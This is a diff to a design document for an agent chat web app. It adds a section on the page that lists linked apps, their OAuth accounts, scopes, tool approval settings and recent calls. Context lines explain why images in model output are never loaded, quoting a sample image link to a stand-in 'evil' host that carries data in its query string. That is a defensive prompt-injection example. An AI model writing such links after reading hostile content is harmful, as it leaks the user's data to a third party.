@@ -246,6 +246,14 @@ A tool call is drawn as a closed `<details>` block. Its `<summary>` is one short
 
 The server keeps memories per user ([27](27-store-auth.md#agents-and-memories)), using the memory plugin from [22](22-profiles-plugins.md). `Memory.tsx` lets Ana see and fix what the agent remembers about her. It opens from the **Memory** button in the side bar and shows two lists: "About you" (scope `global`) and "What the agent learned" (scope `agent`). It uses plain REST calls, not the event stream, because memories do not change word by word: `api.memories()`, `api.editMemory(id, content)`, `api.deleteMemory(id)` and `api.exportMemories()` (a `memories.json` download). Click a memory to edit it; delete asks once more ("Delete?") before it really deletes, like session delete.
 
+<a id="the-portal-detail-page"></a>
+
+### The portal detail page
+
+The **Portals** page (from the side bar) lists the apps Ana can link, like Gmail or GitHub. Clicking one opens its detail page (`Apps.tsx`). It shows Ana's linked accounts for that app (the default first, see [27](27-store-auth.md#connections)), a **+ Add account** button for OAuth apps, the scopes the app asks for, each tool with "auto" or "needs approval", the MCP URL, and her recent calls from the audit table. The tool list is filled once a chat has used the app, so right after a restart it can be empty.
+
+The page also has a light and a dark theme: colours are CSS variables, the first choice follows the OS setting, and Ana's pick is saved in `localStorage` (`simp.theme`).
+
 > **Implementation notes**
 > - **Continue** shows when `canContinue(state)` is true: the run state is `error`, or it is `idle` and the last item is a notice that starts with `interrupted:` (a server restart cut the run).
 > - Markdown is drawn with `react-markdown`, but images are never loaded; they become plain links. A model that read a harmful file could be tricked into writing `![](https://evil/?d=...)`, and loading that image would send data to a stranger.
